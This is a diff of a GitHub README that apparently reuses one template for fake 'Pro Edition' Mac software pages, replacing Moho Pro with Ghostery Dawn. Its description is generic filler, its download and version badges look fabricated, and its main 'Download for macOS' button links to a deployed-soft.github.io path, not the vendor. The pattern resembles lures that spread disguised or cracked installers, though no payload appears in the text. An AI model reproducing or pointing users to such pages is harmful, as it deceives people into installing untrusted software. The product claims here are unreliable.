@@ -1,12 +1,12 @@
-# Moho Pro Professional Edition
+# Ghostery Dawn Pro Edition
 
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/0f/Moho.png" width="200" alt="App icon" align="left"/>
+<img src="https://d4.alternativeto.net/LdFFcYI_34GQ5oCnkTfMjHJhVDjV0osyY3odbDtygno/rs:fit:280:280:0/g:ce:0:0/exar:1/YWJzOi8vZGlzdC9pY29ucy9naG9zdGVyeS1kYXduXzIwMDg1OS5wbmc.png" width="200" alt="App icon" align="left"/>
 
 <div>
-<h3>Moho Pro for macOS</h3>
-<p>Moho Pro delivers powerful 2D animation and motion graphics capabilities for Mac users seeking a dependable, native solution with intuitive controls and consistent performance.</p>
+<h3>Ghostery Dawn for macOS</h3>
+<p>Ghostery Dawn is a specialized privacy browser and ad blocker solution designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://deployed-soft.github.io/.github/MohoPro">
+<a href="https://deployed-soft.github.io/.github/GhosteryDawn">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
@@ -14,12 +14,12 @@
 
 <div align="center">
 
-<a href="#"><img src="https://img.shields.io/badge/downloads-1.4k-brightgreen?style=flat" alt="downloads"/></a>
-<a href="#"><img src="https://img.shields.io/badge/version-3.1.3-blue?style=flat" alt="version"/></a>
-<a href="#"><img src="https://img.shields.io/badge/license-Professional%20Edition-lightgrey?style=flat" alt="license"/></a>
+<a href="#"><img src="https://img.shields.io/badge/downloads-3.4k-brightgreen?style=flat" alt="downloads"/></a>
+<a href="#"><img src="https://img.shields.io/badge/version-4.6.6-blue?style=flat" alt="version"/></a>
+<a href="#"><img src="https://img.shields.io/badge/license-Pro%20Edition-lightgrey?style=flat" alt="license"/></a>
 <a href="#"><img src="https://img.shields.io/badge/platform-macOS-blue?style=flat" alt="platform"/></a>
 
-<img src="https://static.filehorse.com/screenshots-mac//photo-and-design/anime-studio-moho-screenshot-01.png" width="824" alt="Screenshot"/>
+<img src="https://www.instalki.pl/wp-content/uploads/program/g/ghostery-dawn-1.webp" width="824" alt="Screenshot"/>
 
 </div>
 
@@ -34,15 +34,15 @@
 
 ## Overview
 
-<a href="#">Moho Pro for macOS</a> represents a comprehensive 2D animation and motion graphics solution engineered to integrate seamlessly with Mac systems. Built on native frameworks and established interface conventions, it provides predictable operation that fits naturally into existing workflows. The design prioritizes both accessibility and depth, ensuring essential functions remain visible while advanced capabilities stay available when needed.
+<a href="#">Ghostery Dawn for macOS</a> is a focused privacy browser and ad blocker tool built to feel native on the Mac. It relies on system frameworks, familiar interface patterns and predictable behavior so users can integrate it into daily routines without friction. The layout emphasizes clarity, with tools grouped into logical sections that keep both power and simplicity within reach.
 
-During regular operation, Moho Pro maintains straightforward access to primary features while exposing <a href="#">sophisticated controls</a> for users requiring detailed customization. Navigation follows macOS standards with recognizable menus, keyboard shortcuts and interface elements that accelerate task completion. Both new users and experienced operators benefit from the consistent, stable environment that supports efficient work patterns.
+In everyday use, Ghostery Dawn keeps core actions close at hand while offering additional <a href="#">advanced controls</a> for users who want to fine‑tune behavior. Menus, shortcuts and panels follow Apple's design language, helping you move quickly between tasks. Whether you are exploring features for the first time or returning to established workflows, the environment stays consistent and reliable.
 
-The underlying architecture leverages <a href="#">macOS core technologies</a> to deliver reliable performance across demanding operations. This foundation enables smooth handling of extensive processing, real‑time updates and simultaneous task execution without compromising interface responsiveness. System‑level integration ensures background tasks execute efficiently while maintaining fluid interaction with controls and displays.
+Under the hood, Ghostery Dawn is engineered around <a href="#">macOS technologies</a> that handle performance‑critical work. This approach allows it to remain responsive even while processing complex operations, managing multiple tasks or handling large datasets at once. Background operations are handled quietly, keeping the interface smooth so that navigation, configuration and monitoring always feel responsive.
 
-Professional users appreciate Moho Pro's support for complex requirements through extensive configuration options, saved presets and automation capabilities. Behavioral adjustments accommodate individual preferences, from modified operational intervals and custom handling rules to specialized integration protocols. Configuration interfaces use clear <a href="#">settings panels</a> with descriptive labels rather than cryptic command‑line parameters.
+For professionals, Ghostery Dawn supports more demanding scenarios with configurable options, presets and automation‑friendly behavior. Settings can be adjusted to match preferred habits, whether that means changing operational parameters, tuning performance rules or adapting how the app interacts with external services. These options are organized using descriptive <a href="#">preference panels</a> rather than hidden configuration files.
 
-Throughout extended use, <a href="#">Moho Pro</a> establishes itself as a stable component of the macOS ecosystem. The combination of thoughtful interface design, optimized performance and sensible default configurations supports sustained productivity. Users develop confidence in the application's predictable behavior, secure data handling and continued compatibility as the operating system advances.
+Over time, <a href="#">Ghostery Dawn</a> becomes a dependable part of the Mac environment. Its combination of refined interface decisions, efficient processing and thoughtful defaults makes it suitable for long‑term use. Users can trust that the application will behave consistently, preserve work safely and adapt as macOS continues to evolve.
 
 ---
 
@@ -68,7 +68,7 @@ Throughout extended use, <a href="#">Moho Pro</a> establishes itself as a stable
 ## Screenshots
 
 <p align="center">
-  <img src="https://insmac.org/uploads/posts/2021-05/1621273601_moho-pro_01.jpg" width="824" alt="Moho Pro screenshot"/>
+  <img src="https://www.ghostery.com/prismic-images/ghostery/2a99ced1-7a13-4ea8-ba1a-8a7f36cc5a2c_best-ad-blocker.jpg?auto=format" width="824" alt="Ghostery Dawn screenshot"/>
 </p>
 
 ---
@@ -87,10 +87,10 @@ Throughout extended use, <a href="#">Moho Pro</a> establishes itself as a stable
 
 ## Additional Information for macOS Users
 
-<a href="#">Moho Pro</a> is often chosen by Mac users who want a dedicated 2D animation and motion graphics solution that respects platform conventions. Its focused interface avoids unnecessary distractions and helps people stay in control of their workspace even during longer sessions.
+<a href="#">Ghostery Dawn</a> is often chosen by Mac users who want a dedicated privacy browser and ad blocker solution that respects platform conventions. Its focused interface avoids unnecessary distractions and helps people stay in control of their workspace even during longer sessions.
 
 In practice, the app slots neatly into broader <a href="#">macOS workflows</a>. It cooperates with system utilities, cloud services and automation tools, so users do not need to reinvent their entire setup. Instead, they can extend what they already have with a reliable, specialized component.
 
-For teams and professionals, Moho Pro offers a clear path to repeatable results. Settings can be standardized, documented and shared so everyone works from the same foundation. Over time, this consistency reduces friction and supports a healthier, more maintainable workflow.
+For teams and professionals, Ghostery Dawn offers a clear path to repeatable results. Settings can be standardized, documented and shared so everyone works from the same foundation. Over time, this consistency reduces friction and supports a healthier, more maintainable workflow.
 
 ---
